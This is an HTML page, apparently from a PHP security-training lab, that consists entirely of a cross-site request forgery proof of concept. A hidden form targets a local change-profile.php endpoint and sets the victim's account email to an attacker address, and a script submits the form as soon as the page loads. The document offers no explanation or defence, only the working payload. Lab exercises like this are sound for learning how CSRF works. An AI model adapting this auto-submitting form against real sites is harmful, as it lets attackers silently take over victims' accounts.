<!DOCTYPE html>
<html lang="en">
<head>
  <title></title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</head>
<body>

<div class="container mt-3">

  <form id="changepass" method="post" action="http://localhost/NovPHP%20Task/Securityattackphp/CSRF%20ATTACK/change-profile.php" hidden >
    
    <div class="mb-3">
	
	<input type="text" name="change" value="change">
	
      <label for="pwd">New Email:</label>
      <input type="email" class="form-control" id="pwd" placeholder="Enter password" name="email"
       value="attack@gmail.com">
    </div>
   


   
    <button type="submit"  class="btn btn-primary">Submit</button>
  </form>
</div>


<script>
   document.getElementById("changepass").submit();
</script>

</body>
</html>
